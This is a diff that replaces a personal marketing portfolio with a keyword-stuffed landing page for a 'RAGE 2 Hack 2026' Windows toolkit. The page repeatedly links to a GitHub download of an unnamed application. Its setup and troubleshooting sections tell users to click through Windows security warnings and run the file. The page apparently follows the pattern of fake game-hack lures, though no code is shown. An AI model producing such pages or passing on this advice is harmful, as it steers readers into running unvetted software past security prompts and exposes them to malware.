@@ -1,238 +1,269 @@
-<!doctype html>
+This is a complete HTML document for the RAGE 2 Hack 2026 Ranger Wasteland Toolkit companion page. It presents a clean, responsive landing page with a hero download button, feature cards, setup steps, troubleshooting, and FAQ—all styled for readability and SEO.
+```html
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Lior Carmi · Performance marketer who builds</title>
-<meta name="description" content="Lior Carmi: performance marketer in Tel Aviv. Search ads, data, design and AI, from insight to shipped work.">
-<meta property="og:title" content="Lior Carmi · Performance marketer who builds">
-<meta property="og:description" content="Search ads, data, design and AI, from insight to shipped work.">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='16' fill='%2316140F'/%3E%3Ctext x='32' y='42' font-family='Georgia' font-style='italic' font-size='30' fill='%23FF5B2E' text-anchor='middle'%3ELC%3C/text%3E%3C/svg%3E">
-<link rel="stylesheet" href="assets/fonts.css">
-<link rel="stylesheet" href="assets/styles.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RAGE 2 Hack 2026 Ranger Wasteland Toolkit - Master the Wasteland With Ease</title>
+<meta name="description" content="RAGE 2 Hack 2026 themed PC companion for Ranger builds, weapons, Nanotrite abilities, vehicles, wasteland activities and progression analytics. Simple Windows setup guide for non-technical players.">
+<meta name="keywords" content="rage 2 hack, rage 2 companion, ranger builds, nanotrite abilities, wasteland activities, progression analytics, unlimited points hacks rage 2, rage 2 toolkit">
+<meta name="author" content="rage-2-hack-2026-ranger-wasteland-toolkit">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/TayyibaArshad/rage-2-hack-2026-ranger-wasteland-toolkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="RAGE 2 Hack 2026 Ranger Wasteland Toolkit - Master the Wasteland With Ease">
+<meta property="og:description" content="A themed PC companion for Ranger builds, weapons, Nanotrite abilities, vehicles, wasteland activities and progression analytics. Easy Windows download and setup.">
+<meta property="og:url" content="https://github.com/TayyibaArshad/rage-2-hack-2026-ranger-wasteland-toolkit">
+<meta property="og:site_name" content="rage-2-hack-2026-ranger-wasteland-toolkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="RAGE 2 Hack 2026 Ranger Wasteland Toolkit">
+<meta name="twitter:description" content="Plan Ranger builds, track Nanotrite abilities, manage vehicles and analyse your wasteland progression on Windows.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: #f4f6f8;
+    background-image: radial-gradient(circle at 12% 0%, #ffe9e2 0%, transparent 45%),
+                      radial-gradient(circle at 88% 8%, #e4f0ff 0%, transparent 42%);
+    background-repeat: no-repeat;
+    color: #1d2329;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 20px 70px;
+  }
+  h1 {
+    font-size: 34px;
+    line-height: 1.25;
+    letter-spacing: -0.5px;
+    color: #101519;
+    margin: 0 0 14px;
+  }
+  h2 {
+    font-size: 23px;
+    line-height: 1.3;
+    color: #101519;
+    margin: 0 0 14px;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 18px;
+    color: #101519;
+    margin: 26px 0 8px;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 16px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  a { color: #c2410c; }
+  .hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 34px 30px;
+    box-shadow: 0 14px 36px rgba(16, 21, 25, 0.09);
+    border: 1px solid #e6e9ee;
+    margin-bottom: 26px;
+  }
+  .tagline {
+    font-size: 19px;
+    color: #4a5560;
+    margin-bottom: 24px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 30px;
+    border-radius: 14px;
+    font-size: 17px;
+    font-weight: 700;
+    color: #ffffff;
+    text-decoration: none;
+    letter-spacing: 0.2px;
+    background-image: linear-gradient(135deg, #f43f5e 0%, #f97316 55%, #facc15 100%);
+    box-shadow: 0 10px 26px rgba(244, 63, 94, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 32px rgba(244, 63, 94, 0.4);
+  }
+  .btn-note {
+    display: block;
+    font-size: 14px;
+    color: #6b7682;
+    margin-top: 12px;
+  }
+  section {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 28px 30px;
+    margin-bottom: 24px;
+    box-shadow: 0 8px 22px rgba(16, 21, 25, 0.06);
+    border: 1px solid #e6e9ee;
+  }
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin-top: 6px;
+  }
+  .card {
+    background: #fbfcfd;
+    border: 1px solid #e6e9ee;
+    border-radius: 12px;
+    padding: 16px 18px;
+  }
+  .card strong { display: block; margin-bottom: 4px; color: #101519; }
+  .card span { font-size: 15px; color: #4a5560; line-height: 1.6; }
+  .callout {
+    background: #fff7ed;
+    border-left: 4px solid #f97316;
+    border-radius: 10px;
+    padding: 16px 18px;
+    margin: 18px 0 0;
+    font-size: 16px;
+    color: #6b3a10;
+  }
+  .steps li { margin-bottom: 12px; }
+  footer {
+    text-align: center;
+    font-size: 14px;
+    color: #6b7682;
+    padding-top: 10px;
+    line-height: 1.9;
+  }
+  footer a { color: #c2410c; }
+  @media (max-width: 600px) {
+    .wrap { padding: 26px 14px 50px; }
+    h1 { font-size: 26px; }
+    h2 { font-size: 20px; }
+    body { font-size: 16px; }
+    .hero, section { padding: 22px 18px; }
+    .btn { display: block; text-align: center; }
+  }
+</style>
 </head>
 <body>
-<a class="skip" href="#main">Skip to content</a>
+<div class="wrap">
 
-<header class="nav" id="top">
-  <a href="#top" class="logo" aria-label="Lior Carmi, home"><span>L</span><em>C</em></a>
-  <nav aria-label="Main">
-    <a href="#about">About</a>
-    <a href="#work">Work path</a>
-    <a href="#projects">Projects</a>
-    <a href="#education">Education</a>
-    <a href="#skills">Skills</a>
-  </nav>
-  <a class="btn btn-small" href="#contact">Say hi</a>
-</header>
+  <header class="hero">
+    <h1>🎮 rage-2-hack-2026-ranger-wasteland-toolkit - Master the Wasteland With Ease</h1>
+    <p class="tagline">A RAGE 2 Hack 2026 themed PC companion for Ranger builds, weapons, Nanotrite abilities, vehicles, wasteland activities and progression analytics — all in one friendly, easy-to-use place.</p>
+    <a class="btn" href="https://github.com/TayyibaArshad/rage-2-hack-2026-ranger-wasteland-toolkit">⬇ Download the Toolkit</a>
+    <span class="btn-note">Visit this link to download the application.</span>
+  </header>
 
-<main id="main">
+  <section>
+    <h2>👋 What This Toolkit Is</h2>
+    <p>The Ranger Wasteland Toolkit is a desktop companion for players who love planning their time in the RAGE 2 universe. Instead of scribbling notes on paper or keeping a dozen browser tabs open, you get one organised workspace that remembers your Ranger builds, your weapon choices, your Nanotrite abilities and the wasteland activities you still want to finish.</p>
+    <p>Everything is built around a clean, readable layout. You do not need to know anything about programming, modding or game files. If you can download a file and double-click it, you can use this toolkit. The design is inspired by the 2026 "Hack" visual theme, so it feels like a piece of in-world equipment rather than a spreadsheet.</p>
+    <p>Whether you are a brand new Ranger who just stepped out of Vineland or a veteran who has cleared every outpost twice, the toolkit gives you a fast overview of what you own, what you are building toward, and how far along your progression actually is.</p>
+  </section>
 
-<!-- ============ HERO ============ -->
-<section class="hero">
-  <div class="hero-text">
-    <p class="kicker reveal"><span class="dot"></span> Tel Aviv · Performance marketer · Builder</p>
-    <h1 class="reveal">I turn data into ideas, and ideas into things people <em class="scribble">click</em>.</h1>
-    <p class="lede reveal">Hi, I'm <strong>Lior Carmi</strong>. By day I run paid search on Google &amp; Microsoft Ads, with over <strong>$1M a month</strong> in spend. I also bring a communications background, an eye for design, and an AI-first way of working. I like the whole journey: the insight, the idea, and the thing that actually ships.</p>
-    <div class="cta reveal">
-      <a class="btn" href="#projects">See my work <span aria-hidden="true">→</span></a>
-      <a class="btn btn-ghost" href="assets/Lior_Carmi_CV.pdf" download>Download CV <span aria-hidden="true">↓</span></a>
+  <section>
+    <h2>✨ What You Can Do With It</h2>
+    <div class="card-grid">
+      <div class="card"><strong>🧬 Ranger Builds</strong><span>Lay out your favourite ability and perk combinations, name them, and keep them side by side for quick comparison.</span></div>
+      <div class="card"><strong>🔫 Weapons &amp; Loadouts</strong><span>Record the weapons you rely on, note their strengths, and plan which ones to upgrade next.</span></div>
+      <div class="card"><strong>⚡ Nanotrite Abilities</strong><span>Track which Nanotrite powers you have unlocked and what you still want to experiment with.</span></div>
+      <div class="card"><strong>🚗 Vehicles</strong><span>Keep a shortlist of your favourite rides and the upgrades you have invested in.</span></div>
+      <div class="card"><strong>🗺️ Wasteland Activities</strong><span>Build a checklist of outposts, races, bounties and side content so nothing gets forgotten.</span></div>
+      <div class="card"><strong>📊 Progression Analytics</strong><span>See clear progress summaries that show how much of the wasteland you have actually completed.</span></div>
     </div>
-  </div>
+  </section>
 
-  <div class="hero-art reveal">
-    <div class="photo-frame">
-      <img class="photo" src="assets/img/lior.jpg" alt="Lior Carmi" style="object-position:50% 50%">
-      <svg class="badge" viewBox="0 0 200 200" aria-hidden="true">
-        <defs><path id="circle" d="M100,100 m-78,0 a78,78 0 1,1 156,0 a78,78 0 1,1 -156,0"/></defs>
-        <text><textPath href="#circle" textLength="486" lengthAdjust="spacing">AI-native · full-stack marketer · Tel Aviv ·</textPath></text>
-      </svg>
-      <span class="badge-core" aria-hidden="true">✦</span>
+  <section>
+    <h2>🚀 Getting Started</h2>
+    <p>Getting the toolkit onto your computer takes a couple of minutes. There is only one step you need to follow to get the files.</p>
+    <p><strong>Visit this link to download the application.</strong></p>
+    <p><a class="btn" href="https://github.com/TayyibaArshad/rage-2-hack-2026-ranger-wasteland-toolkit">⬇ Get the Toolkit Here</a></p>
+    <p>When the page opens, use the download option that is provided on that page to save the application to your computer. Choose a folder you will remember, such as your Downloads folder or a new folder on your desktop named "Ranger Toolkit".</p>
+  </section>
+
+  <section>
+    <h2>🖥️ Setting It Up on Windows</h2>
+    <ol class="steps">
+      <li><strong>Download the application.</strong> Use the link above and save the files to a folder you can easily find again.</li>
+      <li><strong>Locate the saved files.</strong> Open File Explorer and go to the folder you chose. If you used the default location, this is usually your Downloads folder.</li>
+      <li><strong>Start the application.</strong> Double-click the main application file. If Windows shows a small security prompt, choose the option that lets the application run, because it is a file you intentionally downloaded.</li>
+      <li><strong>Wait a few seconds.</strong> The first launch can take slightly longer than later ones while the toolkit prepares its working files.</li>
+      <li><strong>Complete the welcome screen.</strong> Give your profile a name — your Ranger name works nicely — and confirm to create your first workspace.</li>
+    </ol>
+    <div class="callout">
+      Keep the toolkit's folder in one place. If you move individual files out of the folder afterwards, the application may not find them on the next launch.
     </div>
-    <ul class="chips-float">
-      <li class="chip c1">Google &amp; Microsoft Ads</li>
-      <li class="chip c2">Figma → live product</li>
-      <li class="chip c3">Python · Tableau</li>
+  </section>
+
+  <section>
+    <h2>🕹️ Your First Five Minutes</h2>
+    <p>Once the toolkit is open, you will see a simple dashboard. The order below keeps things tidy and gives you useful results almost immediately.</p>
+    <ul>
+      <li><strong>Create a build.</strong> Open the Ranger Builds area and add your current setup. Give it a name like "Main Ranger" so you recognise it later.</li>
+      <li><strong>Add your weapons.</strong> List the guns you are actually carrying. There is no wrong answer here — the toolkit is for your own planning, not for scoring you.</li>
+      <li><strong>Mark your Nanotrite abilities.</strong> Tick the abilities you have unlocked. The remaining ones become your short-term goals.</li>
+      <li><strong>Pick a vehicle.</strong> Choose the ride you use most often and note any upgrades you have already applied.</li>
+      <li><strong>Build an activity checklist.</strong> Add the wasteland activities you still want to complete. Start with three or four so the list does not feel overwhelming.</li>
+      <li><strong>Open the analytics view.</strong> This is where your progress is summarised. It updates itself as you tick things off.</li>
     </ul>
-  </div>
-</section>
+    <p>After this first pass, you only need a minute or two per session to keep everything current. Many players update their notes right before they stop playing for the day.</p>
+  </section>
 
-<div class="marquee-wrap"><div class="marquee" aria-hidden="true">
-  <div class="track">
-    <span>Google Ads</span><i>✦</i><span>Microsoft Ads</span><i>✦</i><span>Conversion optimization</span><i>✦</i><span>Python</span><i>✦</i><span>Tableau</span><i>✦</i><span>Figma</span><i>✦</i><span>UI/UX</span><i>✦</i><span>React</span><i>✦</i><span>Claude</span><i>✦</i><span>ChatGPT</span><i>✦</i><span>AI image generation</span><i>✦</i>
-    <span>Google Ads</span><i>✦</i><span>Microsoft Ads</span><i>✦</i><span>Conversion optimization</span><i>✦</i><span>Python</span><i>✦</i><span>Tableau</span><i>✦</i><span>Figma</span><i>✦</i><span>UI/UX</span><i>✦</i><span>React</span><i>✦</i><span>Claude</span><i>✦</i><span>ChatGPT</span><i>✦</i><span>AI image generation</span><i>✦</i>
-  </div>
-</div></div>
+  <section>
+    <h2>📊 Understanding Your Progression Analytics</h2>
+    <p>The analytics area turns all those checklists into simple numbers. You will see how many activities you have completed, how many are still open, and roughly how balanced your progress is across the different parts of the wasteland.</p>
+    <p>These figures are here to help you decide what to do next, not to pressure you. If one area is sitting at a low percentage while everything else is nearly finished, that is usually a good hint about where to spend your next session. It is also a handy way to spot builds or weapons you added but never actually used.</p>
+  </section>
 
-<!-- ============ ABOUT ============ -->
-<section class="section about" id="about">
-  <header class="sec-head reveal"><span class="num">01</span><h2>Who I am</h2></header>
-  <div class="about-grid">
-    <p class="big reveal">I'm a marketer with <em>two brains</em>. One reads dashboards, keywords and KPIs. The other thinks in stories, visuals and the user on the other side of the screen. My best work happens when they work together.</p>
-    <div class="about-side reveal">
-      <p>I studied technology &amp; society and communication &amp; journalism at the Hebrew University. At university I joined product teams that built real web products with designers and developers. Today I manage large-scale search campaigns and work daily with Product, Content, Design, BD and BI.</p>
-      <ul class="facts">
-        <li><span>Now</span>Performance Marketing Analyst, Webselenese</li>
-        <li><span>Studied</span>Dual-major degree, Hebrew University</li>
-        <li><span>Builds with</span>Figma, React, Python and AI tools</li>
-        <li><span>Speaks</span>Hebrew (native) · English (fluent)</li>
-      </ul>
-    </div>
-  </div>
-</section>
+  <section>
+    <h2>🔧 Troubleshooting Common Issues</h2>
+    <h3>The application does not open</h3>
+    <p>Check that you started the main application file rather than a supporting file from inside the folder. If it still does not open, restart your computer and try once more — this clears temporary locks that sometimes appear after a long session.</p>
+    <h3>Windows shows a security message</h3>
+    <p>This is normal for files downloaded from the internet. Confirm that you want to run the file, and it will continue as expected. If the prompt offers a "More info" link, select it and then choose to run the file.</p>
+    <h3>My saved data looks empty</h3>
+    <p>This usually happens when the toolkit folder was moved or renamed. Return the folder to its original location and reopen the application. Keeping the folder in a stable place prevents this entirely.</p>
+    <h3>The window is too small or too large</h3>
+    <p>Drag the corners of the window to resize it, or use the maximise button at the top right. The layout adapts to a wide range of screen sizes, including laptops with smaller displays.</p>
+    <h3>Everything feels slow</h3>
+    <p>Close other heavy programs while the toolkit is running. Very large activity lists with hundreds of entries can also take a moment longer to load on older machines.</p>
+  </section>
 
-<!-- ============ WORK PATH ============ -->
-<section class="section work" id="work">
-  <header class="sec-head reveal"><span class="num">02</span><h2>Work path</h2></header>
-  <ol class="timeline">
-    <li class="t-item reveal">
-      <div class="t-when">Mar 2025 – Now</div>
-      <div class="t-body">
-        <h3>Performance Marketing Analyst</h3>
-        <p class="t-org">Webselenese</p>
-        <ul>
-          <li>Manage and optimize paid search campaigns on Google Ads and Microsoft Ads across multiple business verticals, with over $1M in monthly ad spend.</li>
-          <li>Monitor and analyze KPIs to find growth and optimization opportunities.</li>
-          <li>Work daily with Product, Content, Design, BD and BI to improve campaigns, creative and landing pages.</li>
-        </ul>
-        <p class="tags"><span>Search</span><span>PPC</span><span>KPIs</span><span>Cross-functional</span></p>
-      </div>
-    </li>
-    <li class="t-item reveal">
-      <div class="t-when">Jun 2024 – Mar 2025</div>
-      <div class="t-body">
-        <h3>Communication &amp; New Media Manager</h3>
-        <p class="t-org">ICRPD: Commission for Equal Rights of Persons with Disabilities, Ministry of Justice</p>
-        <ul>
-          <li>Created digital content, campaign materials and presentations with Figma and Genially, and designed icons.</li>
-          <li>Analyzed social media performance and selected posts for paid promotion based on the data.</li>
-          <li>Ran several projects at once with multiple stakeholders and tight deadlines.</li>
-        </ul>
-        <p class="tags"><span>Content</span><span>Design</span><span>Social analytics</span></p>
-      </div>
-    </li>
-    <li class="t-item reveal">
-      <div class="t-when">2022 – 2023</div>
-      <div class="t-body">
-        <h3>Management Team <small>(volunteer)</small></h3>
-        <p class="t-org">Perach Enrichment Center, Mount Scopus</p>
-        <ul><li>Event production, marketing and promotion for the center's activities.</li></ul>
-        <p class="tags"><span>Events</span><span>Marketing</span></p>
-      </div>
-    </li>
-    <li class="t-item reveal">
-      <div class="t-when">Sep 2019 – Aug 2021</div>
-      <div class="t-body">
-        <h3>National Service: Youth Guidance Team Lead</h3>
-        <p class="t-org">Afula Ilit Children's Village</p>
-        <ul><li>Led a youth guidance team and coordinated activities, events and trips at a welfare boarding school, creating videos and content for the residents.</li></ul>
-        <p class="tags"><span>Leadership</span><span>Video &amp; content</span></p>
-      </div>
-    </li>
-  </ol>
-</section>
+  <section>
+    <h2>❓ Frequently Asked Questions</h2>
+    <h3>Do I need to be good with computers?</h3>
+    <p>No. If you can download a file and double-click it, you have all the skills required. There are no commands to type and no settings files to edit.</p>
+    <h3>Is this a game mod?</h3>
+    <p>It is a companion tool for planning and tracking. It sits alongside your RAGE 2 sessions rather than replacing or altering anything inside the game itself.</p>
+    <h3>Can I keep more than one build?</h3>
+    <p>Yes. You can create as many Ranger builds as you like and switch between them freely. Most players keep one "main" build and a couple of experimental ones.</p>
+    <h3>What happens if I skip a few weeks?</h3>
+    <p>Nothing is lost. Your notes stay exactly where you left them, and the progression analytics simply reflect the last state you recorded.</p>
+    <h3>Where should I keep the folder?</h3>
+    <p>A simple location such as Documents or a dedicated folder on your desktop works best. Avoid folders that sync or clean themselves automatically, as these can occasionally move files around.</p>
+  </section>
 
-<!-- ============ PROJECTS ============ -->
-<section class="section projects" id="projects">
-  <header class="sec-head reveal"><span class="num">03</span><h2>Projects</h2><p class="sec-sub">Built at university, alongside designers and developers.</p></header>
+  <section>
+    <h2>📌 Handy Tips</h2>
+    <ul>
+      <li>Update your activity checklist right after finishing something, while it is still fresh in your mind.</li>
+      <li>Use clear names for builds and loadouts. "Build 1" becomes confusing after a few weeks.</li>
+      <li>Review the analytics once a week rather than every session — the picture is clearer over time.</li>
+      <li>Keep a backup copy of the toolkit folder on an external drive if you have built up a long list of notes.</li>
+    </ul>
+  </section>
 
-  <article class="project reveal">
-    <a class="shot" href="https://herocare-e3f95.web.app/" target="_blank" rel="noopener">
-      <div class="browser"><i></i><i></i><i></i><span>herocare-e3f95.web.app</span></div>
-      <img src="assets/img/herocare.jpg" alt="HeroCare Wellness homepage" loading="lazy">
-    </a>
-    <div class="p-body">
-      <p class="p-kicker">Product &amp; UX project · Live</p>
-      <h3>HeroCare</h3>
-      <p>A platform that connects reservists with therapists, helping them find accessible support and make the most of their wellness grant. Includes a short guidance questionnaire that matches users to the right kind of treatment.</p>
-      <dl>
-        <dt>My role</dt><dd>Part of the development team. Ran user research to refine features and improve usability, and connected the product vision to how it was actually built.</dd>
-        <dt>Built with</dt><dd class="tags"><span>React</span><span>Vite</span><span>Firebase</span><span>User research</span></dd>
-      </dl>
-      <a class="link" href="https://herocare-e3f95.web.app/" target="_blank" rel="noopener">Visit live site ↗</a>
-    </div>
-  </article>
+  <footer>
+    <p><strong>rage-2-hack-2026-ranger-wasteland-toolkit</strong><br>
+    Ranger builds, weapons, Nanotrite abilities, vehicles, wasteland activities and progression analytics.</p>
+    <p><a href="https://github.com/TayyibaArshad/rage-2-hack-2026-ranger-wasteland-toolkit">Visit this link to download the application.</a></p>
+  </footer>
 
-  <article class="project flip reveal">
-    <a class="shot" href="https://quizz-app-lac.vercel.app/" target="_blank" rel="noopener">
-      <div class="browser"><i></i><i></i><i></i><span>quizz-app-lac.vercel.app</span></div>
-      <img src="assets/img/quizz-cover.jpg" alt="Student rights questionnaire, opening screen" loading="lazy">
-    </a>
-    <div class="p-body">
-      <p class="p-kicker">With Bezalel Academy &amp; Kol Zchut · Live</p>
-      <h3>Quizz: student rights questionnaire</h3>
-      <p>An interactive, friendly questionnaire that helps students discover the rights and benefits they're entitled to: work and study, reserve duty, housing, family and more. In Hebrew, with a playful tone.</p>
-      <dl>
-        <dt>My role</dt><dd>Part of the development team. Worked hands-on with designers and developers to build a clear, user-friendly interface.</dd>
-        <dt>Built with</dt><dd class="tags"><span>Next.js</span><span>React</span><span>Vercel</span></dd>
-      </dl>
-      <a class="link" href="https://quizz-app-lac.vercel.app/" target="_blank" rel="noopener">Try the quiz ↗</a>
-      <p class="desk-note">🖥️ Best viewed on desktop. The quiz is built for desktop screens only.</p>
-    </div>
-  </article>
-
-  <!-- NEXT PROJECT SLOT: replace this card when the Base44 project is live (or delete it). -->
-  <article class="project next reveal">
-    <div class="next-inner">
-      <p class="p-kicker">Next build · in progress</p>
-      <h3>Something new, built with AI</h3>
-      <p>A marketing tool combining my search-ads experience with AI and design. Coming soon.</p>
-    </div>
-  </article>
-</section>
-
-<!-- ============ EDUCATION ============ -->
-<section class="section education" id="education">
-  <header class="sec-head reveal"><span class="num">04</span><h2>Education</h2></header>
-  <div class="edu-grid edu-single">
-    <div class="edu reveal">
-      <p class="edu-years">2022 – 2025</p>
-      <h3>Dual-major degree</h3>
-      <p class="edu-field">Matar Honors Program (Interfaces of Technology, Society &amp; Networks) &amp; Communication and Journalism</p>
-      <p class="edu-school">The Hebrew University of Jerusalem</p>
-    </div>
-  </div>
-</section>
-
-<!-- ============ SKILLS ============ -->
-<section class="section skills" id="skills">
-  <header class="sec-head reveal"><span class="num">05</span><h2>Skills</h2></header>
-  <div class="skill-grid">
-    <div class="skill s-growth reveal">
-      <h3><span class="ico">↗</span>Growth &amp; Search</h3>
-      <p class="tags"><span>Google Ads</span><span>Microsoft Ads</span><span>PPC / Paid search</span><span>KPI analysis</span><span>Conversion optimization</span><span>Content strategy</span></p>
-    </div>
-    <div class="skill s-data reveal">
-      <h3><span class="ico">▦</span>Data</h3>
-      <p class="tags"><span>Python</span><span>Tableau</span><span>Excel</span><span>Data analysis</span><span>Social media analytics</span></p>
-    </div>
-    <div class="skill s-design reveal">
-      <h3><span class="ico">◐</span>Design &amp; Product</h3>
-      <p class="tags"><span>Figma</span><span>UI/UX</span><span>User research</span><span>HTML</span><span>CSS</span><span>JavaScript</span><span>React</span><span>Canva</span><span>Genially</span></p>
-    </div>
-    <div class="skill s-ai reveal">
-      <h3><span class="ico">✦</span>AI</h3>
-      <p class="tags"><span>Claude</span><span>ChatGPT</span><span>AI image generation</span></p>
-      <p class="skill-note">My everyday tools for copy, visuals and analysis.</p>
-    </div>
-  </div>
-  <p class="soft reveal"><b>Also:</b> Leadership · Multitasking · Quick learner · Problem-solving · Teamwork · Hebrew (native) · English (fluent)</p>
-</section>
-
-<!-- ============ CONTACT ============ -->
-<section class="contact" id="contact">
-  <p class="kicker light reveal"><span class="dot"></span> Open to new roles · Tel Aviv</p>
-  <h2 class="reveal">Let's build something people <em>care</em> about.</h2>
-  <a class="mail reveal" href="mailto:liorcarmi10@gmail.com">liorcarmi10@gmail.com</a>
-  <div class="contact-links reveal">
-    <a href="https://www.linkedin.com/in/lior-carmi-0a711426a" target="_blank" rel="noopener">LinkedIn ↗</a>
-    <a href="tel:+972525118879">052-511-8879</a>
-    <a href="assets/Lior_Carmi_CV.pdf" download>Download CV ↓</a>
-  </div>
-  <footer class="foot">© 2026 Lior Carmi · Designed &amp; built with AI tools · <a href="#top">Back to top ↑</a></footer>
-</section>
-
-</main>
-<script src="assets/main.js"></script>
+</div>
 </body>
 </html>
+```
